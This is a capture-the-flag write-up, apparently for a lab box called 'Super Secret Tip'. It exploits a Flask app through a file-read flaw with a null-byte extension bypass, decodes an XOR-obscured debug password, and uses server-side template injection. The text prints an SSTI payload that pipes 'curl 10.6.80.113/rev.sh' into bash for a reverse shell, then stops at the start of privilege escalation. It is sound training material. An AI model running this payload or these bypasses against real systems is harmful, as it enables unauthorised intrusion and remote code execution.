<h3> Super Secret Tip </h3>

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/55a0c0a5-094e-4b26-af40-f516d78cba0f)

Nmap Scan:
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d873046e-e91e-4bf4-9f75-9cae83bd913e)

Going over to the web service running on port 7777 shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e968cddf-3e60-4516-bf44-250c2c2eaad9)

Nothing interesting there cause it's a static page!

Fuzzing for directories/files gives this

```r
➜  SuperSecretTip dirsearch -u http://10.10.248.137:7777/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/mark/.dirsearch/reports/10.10.248.137-7777/-_23-10-02_12-00-35.txt

Error Log: /home/mark/.dirsearch/logs/errors-23-10-02_12-00-35.log

Target: http://10.10.248.137:7777/

[12:00:36] Starting: 
[12:04:52] 200 -    2KB - /debug
[12:04:55] 200 -    2KB - /cloud                                         
                                                                             
Task Completed

```

Going over to `/debug` shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c43dd530-b8e1-47f3-a495-0e9b4cf145b9)

I tried using random input and got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ed627ddb-95bb-46e5-9f59-3947a55d024d)

So we need a password to access this

Let's move over to `/cloud`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d8b7cfec-9f40-440d-8908-4d3959da72b7)

Seems we can download files here

I intercepted the request to download `templates.py`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/981f0ecb-7673-41b6-847f-6bc7fcc734d9)

Ok the python file doesn't seem to have much in it just some few library imports

Since this is a python based web app therefore the main source should be there

It can have various names i.e app.py, source.py

Trying that works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/92bbcb75-1eef-47f8-8ef9-0ec9fdbfb7de)

Let's say you don't know the file name we can also fuzz it using `ffuf`

This is how to do it

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1a71b06a-e073-4c00-8777-1d0a52a9a4b9)

Save the request to a file and run this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0dba99c8-0211-4cfa-99ae-fe160780bda1)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f144a0d0-be24-4b21-bf77-8ba25ab974c4)

With that let's view the app source code
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cf73baf3-7ff3-418d-903c-9e0384fc0ffd)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/46848fe4-0896-49e4-a1a0-beb328b00290)

I'll view each routes / function and explain what it does

The function `illegal_chars_check()`:
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8ed90ac8-3eb8-4c2e-aa75-f0e4e3827e63)

```python
def illegal_chars_check(input):
    illegal = "'&;%"
    error = ""
    if any(char in illegal for char in input):
        error = "Illegal characters found!"
        return True, error
    else:
        return False, error
```

It makes sure that the input which is the parameter passed when this function is called doesn't contain any illegal character which are: `{"'", "&", ";", "%"}`

The function `download()`:
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/62095404-6fd1-49c5-96fa-fbf58fcf5db2)

```python
@app.route("/cloud", methods=["GET", "POST"]) 
def download():
    if request.method == "GET":
        return render_template('cloud.html')
    else:
        download = request.form['download']
        if download == 'source.py':
            return send_file('./source.py', as_attachment=True)
        if download[-4:] == '.txt':
            print('download: ' + download)
            return send_from_directory(app.root_path, download, as_attachment=True)
        else:
            return send_from_directory(app.root_path + "/cloud", download, as_attachment=True)
            # return render_template('cloud.html', msg="Network error occurred")
```

It is called when we access `/cloud` as either a `GET` or `POST` request

When it's a `GET` request it will just render the `cloud.html` file

Else it will get the file to be downloaded from the `download` form field

Then it checks if the file is `source.py`, if it is then it returns the file as an attachment file

But if the file extension ends with `.txt` it will send the file name as an attachment from the current app path

Else it will just give the return the file 

The function `debug()`:
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d43b1d70-fb6b-4e10-8d36-d4b225992e7e)

```python
@app.route("/debug", methods=["GET"]) 
def debug():
    debug = request.args.get('debug')
    user_password = request.args.get('password')
    
    if not user_password or not debug:
        return render_template("debug.html")
        
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debug.html", error=error)

    # I am not very eXperienced with encryptiOns, so heRe you go!
    encrypted_pass = str(debugpassword.get_encrypted(user_password))
    if encrypted_pass != password:
        return render_template("debug.html", error="Wrong password.")
    
    
    session['debug'] = debug
    session['password'] = encrypted_pass
        
    return render_template("debug.html", result="Debug statement executed.")
```

It's called when we access `/debug` as a `GET` request

It gets both the `debug` and `user_password` parameter from the url

Checks if any of the parameter exists and if it doesn't it will render the `debug.html` file

It calls the `illegal_char_check()` function passing our `debug` input as the parameter

If the function returns True it will give the error page

Now here comes the encryption part of the web app. 

It calls the function in the `debugpassword` file passing our `user_password` input as the parameter

It returns the encryped password which is then being compared to the `password` variable

If it doesn't meet the condtion it returns `Wrong Password.`

Else it creates a session token where the `debug` key field contains the `debug` input and the `password` key field contains the `encrypted_pass`

Then it returns the success message

At this point what we obviously want is a way to get the password

Looking at the first portion of the code shows some interesting imports
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/70ce4c96-c865-4e5a-a966-94c6155c9c08)

```python
from flask import *
import hashlib
import os
import ip # from .
import debugpassword # from .
import pwn

app = Flask(__name__)
app.secret_key = os.urandom(32)
password = str(open('supersecrettip.txt').readline().strip())
```

Ok cool we can get the password by using the file rinclusion to read `supersecrettip.txt`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0f645e89-760a-425b-9c5a-2be97db0ed7d)

```python
Password = b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'
```

Now we also some none default python library imports i.e `debugpassword` & `ip`

We can also include it but we need to bypass the extension check

Inorder to do so we can use null bytes i.e `.py%00.txt`

Doing that works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1f20e32a-45d4-4d9f-bd56-1cdd8bd10258)

```python
host_ip = "127.0.0.1"
def checkIP(req):
    try:
        return req.headers.getlist("X-Forwarded-For")[0] == host_ip
    except:
        return req.remote_addr == host_ip
```

So basically what this checks is if the `X-Forwarded-For` header is `127.0.0.1`

The next file is this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e78b9e23-e3b8-4992-b001-6ee7c432f38a)

```python
import pwn

def get_encrypted(passwd):
    return pwn.xor(bytes(passwd, 'utf-8'), b'ayham')
```

Ok cool this just xors our password with the key `ayham`

With that said we can recover the plaintext password by xoring the `password` with the `key`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/64e5d781-fd52-48bd-afdc-09e4ee40e951)

```python
➜  SuperSecretTip python3
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import xor
>>> Password = b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'
>>> 
>>> Key = b'ayham'
>>> 
>>> xor(Password, Key)
b'AyhamDeebugg'
>>>
```

So the expected password is `AyhamDeebugg`

Let's continue viewing the other functions

The function `debugResult()`:
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ff72e845-fd3f-4d4d-9590-c4ed19ca78b0)

```python
@app.route("/debugresult", methods=["GET"]) 
def debugResult():
    if not ip.checkIP(request):
        return abort(401, "Everything made in home, we don't like intruders.")
    
    if not session:
        return render_template("debugresult.html")
    
    debug = session.get('debug')
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debugresult.html", error=error)
    user_password = session.get('password')
    
    if not debug and not user_password:
        return render_template("debugresult.html")
        
    # return render_template("debugresult.html", debug=debug, success=True)
    
    # TESTING -- DON'T FORGET TO REMOVE FOR SECURITY REASONS
    template = open('./templates/debugresult.html').read()
    return render_template_string(template.replace('DEBUG_HERE', debug), success=True, error="")
```

Ok first this makes sure the `X-Forwarded-For` header is `127.0.0.1`

Then it checks if there's a session cookie if there isn't it renders the `debugresult.html` file

The debug variable is set to the value of our `session['debug']` cookie

It makes the debug variable doesn't contain any illegal characters

It also tends to store the `session['password']` cookie value to the `user_password` variable

Then it checks if both variable i.e `debug & user_password` contains a value and if it doesn't it renders the `debugresult.html` file

The at the end it will render our `debug` input as a template which here causes a template injection

So the vulnerability here is Server Side Template Injection (SSTI)

And our injection point is the `debug` parameter

To test it let's confirm it using `{{7*7}}`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4ce0219f-c4f3-47dd-80aa-586fb32aa722)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/57dbafc1-7246-498e-b716-fa19d6f82db9)

Cool it works

Time for a reverse shell 

I grabbed a payload from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-ospopenread)

With a little modification i.e changing single quote to double quote due to the character filter, here's the payload

```r
{{ self.__init__.__globals__.__builtins__.__import__("os").popen("curl 10.6.80.113/rev.sh|bash").read() }}
```

Using that worked
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/04d602f5-ffe0-4b4d-a52c-133059fc5b32)

Time for privilege escalation.

I uploaded linpeas to the box and after running it I got this


